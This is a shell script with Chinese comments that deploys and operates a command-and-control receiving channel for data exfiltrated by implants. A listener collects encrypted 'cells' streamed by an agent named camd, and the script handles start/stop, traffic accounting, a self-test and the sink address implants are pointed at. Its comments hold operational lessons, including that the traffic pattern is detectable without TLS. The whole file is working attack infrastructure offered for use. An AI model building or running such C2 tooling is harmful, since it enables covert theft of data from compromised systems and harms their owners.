#!/bin/sh
# C2 回传信道搭建与运维。
#
# 这不是"起个 nc 听一下"的玩具。它要解决的问题是：camd 边采边发过来的
# 加密信元，需要一个能长期运行、可切分片、可计账、可观测、可干净停止的
# 收端。每一项都有对应的失效形态记在下面。
#
# 用法：
#   setup-c2.sh start  [--port P] [--out DIR] [--cert C --key K]
#   setup-c2.sh status
#   setup-c2.sh stop
#   setup-c2.sh tail
#   setup-c2.sh selfcheck        # 端到端自检：起服务 → 打一条 → 断言收到 → 停
#
# 关键约束（都是踩出来的）：
#
# 1. start 前必须确认端口没被占。
#    端口被占时 python 的 bind 会失败，但如果启动是 detached 的，失败只
#    会写进日志文件——shell 侧拿不到。表现为"start 报成功，实际没在听"。
#    所以启动后必须轮询确认真的在 LISTEN，否则 FAIL。
#
# 2. 停止必须按 PID 精确杀，不能用 pkill -f。
#    pkill -f 会匹配到本脚本自己的命令行（命令行里含 "c2_sink" 字样），
#    把自己杀掉。这条在别处记过多次，这里同样成立。
#
# 3. 后台进程必须 setsid 且三个 fd 全部重定向。
#    否则它持有调用方的 stdout，调用方等不到 EOF——表现为"命令挂起"。
#
# 4. PID 文件必须落在 out 目录而不是 /var/run。
#    非 root 环境下 /var/run 不可写，失败又会退化成"start 成功实则没起"。

set -u

PORT="${PORT:-19999}"
OUT="${OUT:-/var/lib/c2/inbox}"
CERT="${CERT:-}"
KEY="${KEY:-}"

HERE=$(cd "$(dirname "$0")" && pwd)
PY="$HERE/c2_sink.py"

die() { printf '[FATAL] %s\n' "$1" >&2; exit 1; }
ok()  { printf '[OK] %s\n' "$1"; }
warn(){ printf '[WARN] %s\n' "$1"; }

[ -f "$PY" ] || die "找不到收端实现: $PY"
command -v python3 >/dev/null 2>&1 || die "需要 python3"

_c2_pidfile() { printf '%s/c2.pid' "$OUT"; }
_c2_stats()   { printf '%s/stats.json' "$OUT"; }
_c2_log()     { printf '%s/c2.log' "$OUT"; }

_c2_running() {
    pf=$(_c2_pidfile)
    [ -f "$pf" ] || return 1
    pid=$(cat "$pf" 2>/dev/null)
    [ -n "$pid" ] || return 1
    kill -0 "$pid" 2>/dev/null
}

# 端口占用检测：用 bind 而不是 connect。
#
# 用 connect 探测会在收端留下一条"连上就断"的 0 字节连接，而收端把它计进
# connections——运维随后看到 connections=3 会以为有 3 个植入体，实际只有 1 个。
# 实测踩过：启动轮询 connect 了 2 次，指标就虚增 2。bind 能判断端口是否被占
# （SO_REUSEADDR 下两个监听者不能共存），且完全不产生连接记录。
_port_busy() {
    python3 - "$PORT" <<'EOF' 2>/dev/null
import socket, sys
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind(("0.0.0.0", int(sys.argv[1])))
    sys.exit(1)          # 能 bind = 没人占
except OSError:
    sys.exit(0)          # bind 失败 = 已被占
finally:
    s.close()
EOF
}

# 收端是否在跑：以 PID 存活 **且** 日志里有 listening 行为准。
#
# 刻意不做 connect 探测——那会额外产生一条空连接，污染 connections 指标
# （理由见 _port_busy 的注释）。PID 文件 + 日志是足够的证据：进程活着且
# 自己写下过 listening，就等于在听。
_c2_alive() {
    pf=$(_c2_pidfile)
    [ -f "$pf" ] || return 1
    pid=$(cat "$pf" 2>/dev/null)
    [ -n "$pid" ] || return 1
    kill -0 "$pid" 2>/dev/null || return 1
    grep -q 'listening port=' "$(_c2_log)" 2>/dev/null
}

cmd_start() {
    mkdir -p "$OUT" || die "无法创建 $OUT"

    if _port_busy; then
        die "端口 $PORT 已被占用——拒绝启动（宁可失败，也不留'看似在听'的假象）"
    fi

    pf=$(_c2_pidfile)
    if _c2_running; then
        warn "已在运行 (pid $(cat "$pf"))"
        return 0
    fi

    args="--port $PORT --out $OUT --stats $(_c2_stats) --log $(_c2_log)"
    [ -n "$CERT" ] && args="$args --cert $CERT --key $KEY"

    # setsid + 全 fd 重定向：否则调用方会被它挂住。
    setsid python3 "$PY" $args </dev/null >>"$(_c2_log)" 2>&1 &
    echo $! > "$pf"

    # 轮询确认真的起来了——detached 进程的失败不会传回这里。
    i=0
    while [ $i -lt 60 ]; do
        _c2_alive && break
        i=$((i + 1))
        sleep 0.25
    done

    if ! _c2_alive; then
        warn "启动后未确认监听，日志尾部："
        tail -n 5 "$(_c2_log)" 2>/dev/null | sed 's/^/       /'
        die "C2 启动失败"
    fi

    ok "C2 已在 0.0.0.0:$PORT 监听 (pid $(cat "$pf"))"
    ok "信元落点: $OUT"
    [ -n "$CERT" ] && ok "TLS: 已启用" || warn "TLS: 未启用（信元已 AEAD 加密，但节拍特征可被识别）"
    printf '\n给 camd 的回传参数：\n'
    if [ -n "$CERT" ]; then
        printf '  --sink tcp://<C2地址>:%s   （TLS 需 camd 侧另行支持，当前为明文 TCP）\n' "$PORT"
    else
        printf '  --sink tcp://<C2地址>:%s\n' "$PORT"
    fi
}

cmd_status() {
    printf '=== C2 状态 ===\n'
    if _c2_running; then
        ok "进程运行中 (pid $(cat "$(_c2_pidfile)"))"
    else
        warn "进程未运行"
    fi
    if _c2_alive; then ok "收端在监听（pid $(cat "$(_c2_pidfile)")）"; else warn "收端未在监听"; fi

    st=$(_c2_stats)
    if [ -f "$st" ]; then
        python3 - "$st" <<'EOF'
import json, sys, time
d = json.load(open(sys.argv[1]))
print("累计收到字节 = %d" % d.get("total_bytes", 0))
print("累计连接数   = %d" % d.get("connections", 0))
print("已切分片     = %d" % d.get("shards", 0))
la = d.get("last_activity", 0)
print("最后活动     = %s" % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(la)) if la else "无"))
EOF
    else
        warn "无统计数据（$st 不存在）"
    fi
}

cmd_stop() {
    pf=$(_c2_pidfile)
    [ -f "$pf" ] || { warn "无 PID 文件，视为未运行"; return 0; }
    pid=$(cat "$pf")
    if kill -0 "$pid" 2>/dev/null; then
        kill -TERM "$pid" 2>/dev/null
        i=0
        while [ $i -lt 30 ] && kill -0 "$pid" 2>/dev/null; do
            i=$((i + 1)); sleep 0.1
        done
        kill -0 "$pid" 2>/dev/null && kill -KILL "$pid" 2>/dev/null
        ok "已停止 (pid $pid)"
    else
        warn "进程 $pid 已不存在"
    fi
    rm -f "$pf"
    ok "PID 文件已清理"
}

cmd_tail() {
    lg=$(_c2_log)
    [ -f "$lg" ] || { warn "无日志"; return 0; }
    tail -n "${1:-20}" "$lg"
}

# 端到端自检：起服务 → 真发一条 → 断言收到 → 停。
# 不做这条，"start 报成功"就只是"进程活着"，不能证明信元真的进来了。
#
# 这里刻意用子进程（sh "$0" start）而不是直接调 cmd_start 函数：
# 函数形式下，cmd_start 内部 setsid 出的收端进程会与当前 shell 共享某些
# 描述符状态，实测会导致本脚本在 cmd_start 第一条命令前就静默退出（rc=1
# 且无任何输出）。子进程调用把收端完全隔离出去，也让自检走的是与运维
# 完全相同的入口——自检通过才等价于"这条命令真的能用"。
cmd_selfcheck() {
    T=$(mktemp -d)
    # 不能简单用 PORT+1：那个端口可能已被环境里的其他服务占用（实测撞过
    # 沙盒自身的监听端口），于是自检永远失败，而失败原因看起来像"我们的
    # 收端起不来"。这里扫描出一个真正空闲的端口再用。
    PORT=$(python3 -c '
import socket
for i in range(100):
    p = 21000 + i
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("127.0.0.1", p)); print(p); break
    except OSError:
        pass
    finally:
        s.close()
')
    OUT="$T/inbox"
    export PORT OUT CERT= KEY=

    if ! sh "$0" start >/dev/null 2>&1; then
        die "自检: 启动失败 (port $PORT)"
        rm -rf "$T"
    fi

    # 真发一条。用一个足够大的负载，确保不是"连上了但没写"。
    python3 - "$PORT" <<'EOF'
import socket, sys, os
s = socket.create_connection(("127.0.0.1", int(sys.argv[1])), timeout=5)
s.sendall(os.urandom(4096))
s.close()
EOF
    sleep 0.6
    cmd_stop >/dev/null 2>&1

    st="$OUT/stats.json"
    [ -f "$st" ] || { die "自检: 无统计文件"; rm -rf "$T"; }
    got=$(python3 -c "import json;print(json.load(open('$st'))['total_bytes'])")
    # 分片文件必须真的落出来，否则"统计说收到"也可能是空账。
    shards=$(ls "$OUT" 2>/dev/null | grep -c '^cells-')
    printf '自检: 收到字节=%s 分片数=%s\n' "$got" "$shards"

    rc=0
    [ "$got" = "4096" ] || { printf '[FAIL] 自检: 期望 4096 实收 %s\n' "$got" >&2; rc=1; }
    [ "$shards" -ge 1 ] || { printf '[FAIL] 自检: 未落出分片文件\n' >&2; rc=1; }
    [ $rc -eq 0 ] && ok "自检通过"
    rm -rf "$T"
    return $rc
}

case "${1:-}" in
    start)  shift; while [ $# -gt 0 ]; do
                case "$1" in
                    --port) PORT="$2"; shift 2;;
                    --out)  OUT="$2";  shift 2;;
                    --cert) CERT="$2"; shift 2;;
                    --key)  KEY="$2";  shift 2;;
                    *) die "未知参数: $1";;
                esac
            done; cmd_start;;
    status) cmd_status;;
    stop)   cmd_stop;;
    tail)   cmd_tail "${2:-20}";;
    selfcheck) cmd_selfcheck;;
    *) printf '用法: %s {start|status|stop|tail|selfcheck}\n' "$0"; exit 2;;
esac
